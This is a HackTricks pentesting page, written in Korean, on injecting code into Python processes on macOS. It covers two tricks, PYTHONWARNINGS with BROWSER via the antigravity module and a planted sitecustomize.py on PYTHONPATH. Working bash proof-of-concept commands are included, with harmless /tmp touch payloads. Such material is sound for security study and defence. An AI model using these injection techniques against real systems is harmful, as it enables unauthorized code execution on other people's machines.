# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PYTHONWARNINGS` 및 `BROWSER` 환경 변수 사용

공격자가 Python process의 environment를 제어할 수 있다면, Python이 조작된 warning option을 처리하는 동안 `antigravity` module을 import할 때 `PYTHONWARNINGS`와 `BROWSER`의 조합으로 command execution을 트리거할 수 있습니다. 이 technique은 `antigravity`가 Python의 `webbrowser` module을 사용해 URL을 열고, 이 module이 `BROWSER` environment variable을 따르는 방식에 기반합니다.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## `PYTHONPATH` 및 `sitecustomize.py`를 통한 방법

일반적인 시작 과정에서 Python의 `site` 모듈은 사이트별 경로를 추가한 다음 `sitecustomize`라는 이름의 모듈을 가져오려고 시도합니다. 공격자가 읽을 수 있는 디렉터리를 `PYTHONPATH`의 앞부분에 배치하면, 프로세스 환경을 제어하는 공격자는 대상 스크립트보다 먼저 Python이 payload를 가져오도록 할 수 있습니다. `-S` 플래그는 자동 `site` 초기화를 비활성화하며, isolated mode(`-I`)는 `PYTHONPATH`를 무시하고 `-s` 및 `-E`를 암시합니다.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## References

- [1] [Environment Variables를 이용한 Hacking - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Site-specific configuration hook](https://docs.python.org/3/library/site.html)
- [3] [Python command-line and environment](https://docs.python.org/3/using/cmdline.html)
{{#include ../../../banners/hacktricks-training.md}}
